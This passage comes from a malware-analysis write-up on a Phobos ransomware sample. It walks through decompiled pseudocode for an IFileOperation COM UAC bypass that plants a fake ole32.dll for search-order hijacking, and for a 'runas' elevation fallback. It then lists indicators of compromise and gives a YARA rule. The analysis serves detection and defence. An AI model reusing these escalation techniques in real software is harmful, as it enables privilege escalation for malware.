            ppv, n0x3A95 > 0x3A95 ? 0x10800010 : 0x10840414) // SetOperationFlags
    && !((int (__cdecl *)(int, _DWORD, const IID *, if **))SHCreateItemFromParsingName)(
            NewMalwarePath, 0, &CLSID_IShellItem, &IShellItem2Vtbl) ) // declare a shell item (file/dir)
{
    if ( n2 == 1 )
    {
        if ( !((int (__cdecl *)(int, _DWORD, const IID *, void **))SHCreateItemFromParsingName)(
                pathWithDirName, 0, &CLSID_IShellItem, &v15) )
        {
            v7 = (*((int (__cdecl **)(IFileOperationVtbl *, if *, void *, int, _DWORD))ppv->QueryInterface + 16))(
                ppv, IShellItem2Vtbl, v15, ole32DllStr, 0); // IFileOperation::CopyItem
LABEL_10:
            if ( !v7 && !(*((int (__cdecl **)(IFileOperationVtbl *))ppv->QueryInterface + 21))(ppv) )
                // IFileOperation::PerformOperations
                v13 = 1;
        }
    }
    else if ( n2 == 2 )
    {   // delete the shell item created before
        v7 = (*((int (__cdecl **)(IFileOperationVtbl *, if *, _DWORD))ppv->QueryInterface + 18))(ppv, IShellItem2Vtbl, 0);
        goto LABEL_10;
    }
}
// clean up resources
if ( v15 ) (*(void (__cdecl **)(void *))(*(_DWORD *)v15 + 8))(v15);
if ( IShellItem2Vtbl ) (*((void (__cdecl **)(if *))IShellItem2Vtbl->QueryInterface + 2))(IShellItem2Vtbl);
if ( ppv ) (*((void (__cdecl **)(IFileOperationVtbl *))ppv->QueryInterface + 2))(ppv);
```

This function calls `CoGetObject("Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", ..., IFileOperation)`, which launches the auto-elevated COM object `IFileOperation` — letting the malware invoke functions inside `explorer.exe` running at elevated integrity, even though the malware's own process is only medium integrity.

It exploits this to call `IShellFolder::CopyItem`, copying the launcher from `%TEMP%\<serialId>` to `C:\Windows\microsoft.NET\Framework64\v*`, naming it `ole32.dll` — setting up DLL search-order hijacking. On the next call to this function, the copied DLL is removed.

### Triggering the hijack

```c
ShowRansomHtaFile((WCHAR *)targetFuncName, (const WCHAR *)VolumeSerialNumber);
// launches cmpmgmt.msc, which loads ole32.dll
```

And this is the masterstroke: this call launches `cmpmgmt.msc` (Computer Management), which in turn loads `ole32.dll`. Since the malware planted its malicious launcher in a directory that's searched *before* the legitimate System32 in the DLL load order, `cmpmgmt.msc` loads the malicious launcher instead of the real `ole32.dll`.

The malicious launcher simply relaunches the same malware and calls `ExitProcess()` to exit. The malware is now running with the same access token and privileges as `cmpmgmt.msc` — elevated.

Finally, `DeleteFileW(MalwareNewPath)` deletes the dropped malware copy from `%TEMP%`, erasing its traces.

## The Last-Resort Fallback: `TryToRunAsAdmin()`

If none of the above escalation attempts succeed, the malware has one final trick:

```c
if ( TryToRunAsAdmin() )
{
    do
    {
        --n50;
        if ( !sub_2C4F7A((char *)1) ) // more than one instance running -> exit
            break;
        Sleep(0x64u);
    }
    while ( n50 );
}
```

```c
OsVersion = GetVersion();
command = DecryptFromcdataAndPa3(21, 0); // "runas"
lpFilename = (WCHAR *)heapAllocate(0x20Au);

if ( OsVersion >= 6u && isLaunchingUserInAdminGroup() ) // user is in the admin group
{
    disableOrRenablesyswowfsrEdirection((int)&v4, 0);
    if ( command && lpFilename && GetCurrentExePath(lpFilename) )
        __ = runAsAdmin(lpFilename, (const WCHAR *)command);
    // passing "runas" with the exe name to ShellExecute triggers elevation (shows the UAC prompt)
    disableOrRenablesyswowfsrEdirection(v4, 1);
}
```

It first checks that the launching user is an administrator, and if so, calls `runAsAdmin()`:

```c
zerofyAlloced((char *)&pExecInfo.fMask, 0, 0x38u);
pExecInfo.lpVerb = buf;        // "runas"
pExecInfo.lpFile = lpFilename; // path to malware
pExecInfo.cbSize = 60;
pExecInfo.nShow = 1;
pExecInfo.fMask = SEE_MASK_FLAG_DDEWAIT;
return ShellExecuteExW(&pExecInfo);
```

This uses `ShellExecuteEx` to run `runas <path to malware>`, which simply shows the standard UAC prompt — hoping a naive user clicks "Yes" , or the admin-prompt consent behavior to be disabled , in which no UAC will be shown .

## Conclusion

That covers the analysis. This concludes the reverse engineering of this Phobos ransomware sample — from AES-based file encryption and network share/subnet propagation, through multiple privilege escalation paths (token stealing, an `IFileOperation` COM-based UAC bypass via DLL search-order hijacking, and a plain "runas" fallback), to anti-recovery measures like shadow copy and backup catalog deletion.

## Indicators of Compromise

**Ransom note files**, found in any of the following locations:

```
C:\Users\<username>\Desktop
C:\Users\<username>\Public\Public Desktop
```

Or in the root of any drive:

```
C:\, D:\, A:\, ...
```

**Ransom popup window:**

![Ransom popup screenshot](/resources/phobos-rsrcs/1_3bAqkltTzjKA4sdfhjI8fA.png)

**Dropped binaries**, `phobos.exe` and its config file `s7i.txt`, found in any of the startup folders:

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\s7i.txt
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\phobos.exe
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\phobos.exe
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\s7i.txt
```

**Persistence registry key**, "Path to malware" under:

```
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

**Mutex**, in the global namespace:

```
Global\<<BID>><Main drive Serial Number>00000001
```

**Encrypted file extension:**

```
id[F638AC50-2822].[frankmoffit@aol.com].eight
```

## YARA Rule

```yara
rule Phobos_detect
{
    meta:
        description = "Sample rule to detect Phobos v2.9.1. Best-effort, as everything in this sample was decrypted on demand from the .cdata section."
        author = "Hussam aljaar"
    strings:
        $IfileoperationClsid = {1E 6D 82 43 18 E7 EE 42 BC 55 A1 E2 61 C3 7B FE}
        $IshellItemClsid     = {5F AB 7A 94 5C 0A 13 4C B4 D6 4B F7 83 6F C9 F8}
        $Drivetemplate1 = "\\\\?\\X:" ascii wide nocase
        $Drivetemplate2 = "\\\\?\\ :" ascii wide nocase
    condition:
        uint32(uint32(0x3c)) == 0x4550 and any of them
}
```

That's it for this report — I always opt for writing a detailed report so anyone who reads it can get a real glance into the malware's functionality and learn from it.

## Further Reading

- [Bypassing Windows UAC](https://ruuucker.github.io/Bypassing-Windows-uac/)
- [Access Token Manipulation (T1134) — RedTeam Notes](https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation)
- [DLL Hijacking Techniques — Unit 42](https://unit42.paloaltonetworks.com/dll-hijacking-techniques/)